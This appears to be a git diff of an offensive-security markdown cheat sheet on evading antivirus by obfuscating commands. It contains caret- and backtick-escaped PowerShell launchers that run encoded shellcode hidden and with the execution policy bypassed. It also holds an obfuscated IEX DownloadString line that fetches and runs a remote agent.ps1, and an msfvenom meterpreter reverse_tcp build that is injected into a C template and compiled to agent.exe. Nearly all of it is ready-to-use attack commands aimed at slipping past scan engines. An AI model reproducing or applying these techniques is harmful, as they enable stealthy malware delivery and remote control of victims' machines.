@@ -13,22 +13,22 @@
 
 <br /><br /><br />
 
-## batch obfuscation
+## Batch Obfuscation
 
-- string command to obfuscate<br />
+- String command to obfuscate<br />
 `cmd.exe /c powershell.exe -nop -wind hidden -Exec Bypass -noni -enc $shellcode`<br />
-The above string can be obfuscated using the **batch escape caracter** ^<br />
+The above string can be obfuscated using the **batch special caracter: ^** <br />
 
-- string obfuscated<br />
+- String obfuscated<br />
 
       cm^d.e^xe /c po^w^er^shel^l.ex^e -n^op -w^i^nd h^idd^en -Ex^e^c B^yp^a^ss -no^n^i -en^c $shellcode
 
 ---
 
-- string command to obfuscate<br />
+- String command to obfuscate<br />
 `cmd.exe /c powershell.exe -nop -wind hidden -Exec Bypass -noni -enc $shellcode`<br />
 
-- using one batch local variable to serve as our **master key** (varObj) - **file template.bat**<br />
+- Using one batch local variable to serve as our **master key** (%varObj%) - **file: template.bat**<br />
 
       @echo off
       SET varObj=abcdefghijlmnopqrstuvxzkyW0123456789ABCDEFGHIJLMNOPQRSTUVXZKYW
@@ -36,31 +36,48 @@ The above string can be obfuscated using the **batch escape caracter** ^<br />
       exit
 
 
-- Description of varObj master_key:<br />
+- Description of %varObj% master_key:<br />
 https://github.com/r00t-3xp10it/hacking-material-books/blob/master/obfuscation/pedro-Wandoelmo-key.md
       
 
 ---
 
+
 <br /><br /><br />
 
-## powershell obfuscation
+## Bash Obfuscation
 
-- string command to obfuscate<br />
+- String command to obfuscate<br />
+`whoami`<br />
+The above string can be obfuscated using the **bash special caracters: '** or **$@**<br />
+
+- String obfuscated<br />
+
+      w'h'o'am'i
+
+      w$@h$@o$@am$@i
+
+---
+
+<br /><br /><br />
+
+## Powershell Obfuscation
+
+- String command to obfuscate<br />
 `powershell.exe -nop -wind hidden -Exec Bypass -noni -enc $shellcode`<br />
-The above string can be obfuscated using the **powershell escape caracter** `<br />
+The above string can be obfuscated using the **powershell special caracter: `**<br />
 
-- string obfuscated<br />
+- String obfuscated<br />
 
       po`w`er`shel`l.ex`e -n`op -w`i`nd h`idd`en -Ex`e`c B`yp`a`ss -no`n`i -en`c $shellcode
 
 ---
 
-- string command to obfuscate<br />
+- String command to obfuscate<br />
 `powershell.exe IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.71/agent.ps1')`<br />
-The above string can be obfuscated using **powershell escape caracters** **`** and **+** and **$var**<br />
+The above string can be obfuscated using **powershell special caracters:** **`** and **+** and **$var**<br />
 
-- string obfuscated<br />
+- String obfuscated<br />
 
       $get = New-Object "N`et`Web`Cl`ie`nt"
       p`owe`r`she`l`l.exe `IE`X ($get).D`ow`n`loa`dSt`rin`g('h'+'t'+'tp'+':'+'//'+'192.168.1.71/agent.ps1')
@@ -69,20 +86,20 @@ The above string can be obfuscated using **powershell escape caracters** **`** a
 
 <br /><br /><br />
 
-## C to ANCII obfuscation
+## C to ANCII Obfuscation
 
-- encoding shellcode from **C** to **ANCII**
+- Encoding shellcode from **C** to **ANCII**
 
       \x8b\x5a\x00\x27\x0d\x0a  <-- C shellcode
 
       8b5a00270d0a              <-- ANCII shellcode
 
 
-- build shellcode in **C** format
+- Build shellcode in **C** format
 
       msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.69 LPORT=666 -b '\x0a\x0d' -f c -o shellcode.txt
 
-- **parsing** shellcode data
+- **Parsing** shellcode data
 
       # store parsed data into '$store' local var
       store=`cat shellcode.txt | grep -v '=' | tr -d ';' | tr -d '\"' | tr -d '\\' | tr -d 'x' | tr -d '\n'`
@@ -143,13 +160,13 @@ The above string can be obfuscated using **powershell escape caracters** **`** a
 
 <br />
 
-- **embeded** parsed shellcode into **template.c**
+- **Inject** parsed shellcode into **template.c**
 
       # inject shellcode into template.c using SED bash command
       sed -i "s/INSERT_SHELLCODE_HERE/$store/" template.c
 
 
-- compiling template with **GCC**
+- Compile template with **GCC** software
 
       gcc template.c -o agent.exe
 
@@ -158,7 +175,7 @@ The above string can be obfuscated using **powershell escape caracters** **`** a
 
 <br /><br /><br />
 
-## bypass the scan engine (author: avet)
+## Bypass the scan engine (author: daniel sauder: avet)
 
       This next technic writes a file to disk before executing shellcode into target ram ..
 
